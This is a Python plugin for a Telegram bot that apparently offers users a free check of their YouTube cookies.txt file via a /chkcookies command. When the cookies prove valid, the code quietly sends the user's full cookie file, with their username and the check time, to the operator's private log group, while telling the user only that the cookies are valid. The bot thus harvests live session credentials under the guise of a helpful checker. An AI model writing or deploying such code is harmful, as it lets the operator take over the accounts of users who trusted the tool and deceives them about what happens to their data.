import yt_dlp
import os
from datetime import datetime
from config import LOGGER_ID as LOG_GROUP_ID  
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

# Active Users Session System
active_users = {}

# Symbols for Stylish Look
CHECK = "✅"
CROSS = "❌"
CLOCK = "⏳"
USER = "👤"
TIME = "⏰"
RESTART = "🔄"

# ✅ Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users[message.chat.id] = True  # Mark user as active
    await message.reply(f"{CHECK} ɴᴏᴡ ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ! {CLOCK}")

# ❌ Step 2: Handle Wrong Inputs (Restart User)
@app.on_message(filters.private & ~filters.document)
async def warn_wrong_input(client, message):
    if message.chat.id in active_users:
        await message.reply(f"""
{CROSS} ɪɴᴄᴏʀʀᴇᴄᴛ ɪɴᴘᴜᴛ! ʏᴏᴜ ᴍᴜsᴛ ᴏɴʟʏ sᴇɴᴅ `cookies.txt` ғɪʟᴇ.

{RESTART} **Sᴇssɪᴏɴ ʀᴇsᴇᴛ!** Pʟᴇᴀsᴇ ᴛʏᴘᴇ `/chkcookies` ᴀɢᴀɪɴ ᴛᴏ ʀᴇsᴛᴀʀᴛ.
""")
        del active_users[message.chat.id]  # Remove user from active session

# ✅ Step 3: Accept Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply(f"{CROSS} ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ!")
        os.remove(file_path)
        return

    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply(f"{CROSS} ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ɪs ᴇᴍᴘᴛʏ!")
            os.remove(file_path)
            return

        # User Info & Time
        display_name = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")

        # Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = f"{CHECK} ʏᴏᴜʀ ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ᴠᴀʟɪᴅ! "
            log_msg = f"""
{CHECK} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ!
{USER} ᴜsᴇʀ: {display_name}
{TIME} Cʜᴇᴄᴋᴇᴅ ᴀᴛ: {check_time}
"""

            await client.send_document(LOG_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = f"{CROSS} Your ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ɪɴᴠᴀʟɪᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ!"
            log_msg = f"""
{CROSS} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ!
{USER} ᴜsᴇʀ: {display_name}
{TIME} Cʜᴇᴄᴋᴇᴅ ᴀᴛ: {check_time}
"""
            await client.send_message(LOG_GROUP_ID, log_msg)

        await message.reply(msg)

    except Exception as e:
        await message.reply(f"⚠️ ᴇʀʀᴏʀ: `{str(e)}`")

    os.remove(file_path)
    del active_users[message.chat.id]  # Remove user from active session
